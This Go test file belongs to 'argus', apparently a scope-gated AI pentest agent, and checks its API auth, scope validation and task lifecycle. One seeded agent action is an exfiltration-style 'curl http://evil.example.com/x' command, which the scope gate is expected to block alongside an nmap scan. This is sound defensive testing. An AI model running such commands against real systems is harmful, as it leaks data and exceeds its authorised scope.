package api_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/argus/argus/internal/agent"
	"github.com/argus/argus/internal/api"
	"github.com/argus/argus/internal/budget"
	"github.com/argus/argus/internal/engine"
	"github.com/argus/argus/internal/evidence"
	"github.com/argus/argus/internal/gate"
	"github.com/argus/argus/internal/scope"
	"github.com/argus/argus/internal/store"
)

func newServer(t *testing.T, token string) (*httptest.Server, store.Store) {
	t.Helper()
	st := store.NewMemory()
	ev, err := evidence.Open("")
	if err != nil {
		t.Fatal(err)
	}
	res := gate.StaticResolver{Map: map[string][]string{
		"lab.internal":     {"10.20.0.5"},
		"api.lab.internal": {"10.20.0.6"},
	}}
	srv := api.New(api.Deps{
		Store: st, Ev: ev, Budget: budget.New(), Token: token,
		NewGate: func(_ int64, sc *scope.Scope, sink gate.Sink) *gate.Gate {
			return gate.New(sc, res, sink)
		},
		NewExec: func(_ int64, g *gate.Gate) engine.Executor {
			return &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
		},
		NewPlanner: func(int64) engine.Planner { return agent.NewSimPlanner(nil) },
	})
	ts := httptest.NewServer(srv.Handler())
	t.Cleanup(ts.Close)
	return ts, st
}

func post(t *testing.T, url, body string, hdr map[string]string) (*http.Response, string) {
	t.Helper()
	var r io.Reader
	if body != "" {
		r = bytes.NewBufferString(body)
	}
	req, err := http.NewRequest(http.MethodPost, url, r)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, string(b)
}

func TestAuthRequired(t *testing.T) {
	ts, _ := newServer(t, "s3cret")
	resp, _ := http.Get(ts.URL + "/api/tasks")
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("无 token 应 401，实际 %d", resp.StatusCode)
	}
	resp2, _ := http.Get(ts.URL + "/api/health")
	if resp2.StatusCode != http.StatusOK {
		t.Fatalf("health 应免鉴权，实际 %d", resp2.StatusCode)
	}
	req, _ := http.NewRequest(http.MethodGet, ts.URL+"/api/tasks", nil)
	req.Header.Set("Authorization", "Bearer s3cret")
	resp3, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp3.Body.Close()
	if resp3.StatusCode != http.StatusOK {
		t.Fatalf("正确 token 应 200，实际 %d", resp3.StatusCode)
	}
}

func TestCreateRequiresScope(t *testing.T) {
	ts, _ := newServer(t, "")
	resp, body := post(t, ts.URL+"/api/tasks", `{"goal":"x"}`, nil)
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("无范围应 400，实际 %d: %s", resp.StatusCode, body)
	}
	resp2, body2 := post(t, ts.URL+"/api/tasks", `{"scope":[{"kind":"domain_suffix","value":"a.com"}]}`, nil)
	if resp2.StatusCode != http.StatusBadRequest {
		t.Fatalf("无 goal 应 400，实际 %d: %s", resp2.StatusCode, body2)
	}
	resp3, body3 := post(t, ts.URL+"/api/tasks", `{"goal":"x","scope":[{"kind":"cidr","value":"not-a-cidr"}]}`, nil)
	if resp3.StatusCode != http.StatusBadRequest {
		t.Fatalf("非法 CIDR 应 400，实际 %d: %s", resp3.StatusCode, body3)
	}
}

func TestLifecycle(t *testing.T) {
	ts, st := newServer(t, "")
	body := `{"name":"e2e","goal":"闭环","scope":[{"kind":"domain_suffix","value":"lab.internal"}],` +
		`"seed":[` +
		`{"action":"Bash","summary":"{\"command\":\"nmap lab.internal\"}","asset_id":1,"param_key":"scan"},` +
		`{"action":"Bash","summary":"{\"command\":\"curl http://evil.example.com/x\"}","asset_id":2,"param_key":"exfil"}` +
		`]}`
	resp, raw := post(t, ts.URL+"/api/tasks", body, nil)
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("创建应 201，实际 %d: %s", resp.StatusCode, raw)
	}
	var created struct {
		Task struct {
			ID int64 `json:"id"`
		} `json:"task"`
	}
	if err := json.Unmarshal([]byte(raw), &created); err != nil {
		t.Fatal(err)
	}
	id := created.Task.ID
	if id == 0 {
		t.Fatal("缺少 task id")
	}

	r2, raw2 := post(t, fmt.Sprintf("%s/api/tasks/%d/start", ts.URL, id), "", nil)
	if r2.StatusCode != http.StatusAccepted {
		t.Fatalf("启动应 202，实际 %d: %s", r2.StatusCode, raw2)
	}
	r3, _ := post(t, fmt.Sprintf("%s/api/tasks/%d/start", ts.URL, id), "", nil)
	if r3.StatusCode != http.StatusConflict {
		t.Fatalf("重复启动应 409，实际 %d", r3.StatusCode)
	}

	deadline := time.Now().Add(25 * time.Second)
	for time.Now().Before(deadline) {
		task, ok := st.GetTask(id)
		if ok && (task.State == store.TaskDone || task.State == store.TaskStopped) {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	task, _ := st.GetTask(id)
	if task.State != store.TaskDone {
		t.Fatalf("任务终态应为 done，实际 %s", task.State)
	}

	resp4, err := http.Get(fmt.Sprintf("%s/api/tasks/%d/report", ts.URL, id))
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp4.Body)
	resp4.Body.Close()
	md := string(b)
	for _, want := range []string{"ARGUS 报告", "授权范围", "越界拦截", "预算"} {
		if !strings.Contains(md, want) {
			t.Errorf("报告缺少 %q", want)
		}
	}

	resp5, err := http.Get(fmt.Sprintf("%s/api/tasks/%d/violations", ts.URL, id))
	if err != nil {
		t.Fatal(err)
	}
	var vio struct {
		ByLayer map[string]int `json:"by_layer"`
	}
	if err := json.NewDecoder(resp5.Body).Decode(&vio); err != nil {
		t.Fatal(err)
	}
	resp5.Body.Close()
	if vio.ByLayer["exec"] == 0 {
		t.Fatalf("应至少有 1 条 exec 层越界，实际 %+v", vio.ByLayer)
	}

	resp6, err := http.Get(fmt.Sprintf("%s/api/budget", ts.URL))
	if err != nil {
		t.Fatal(err)
	}
	var bud struct {
		Verified bool `json:"evidence_verified"`
	}
	_ = json.NewDecoder(resp6.Body).Decode(&bud)
	resp6.Body.Close()
}
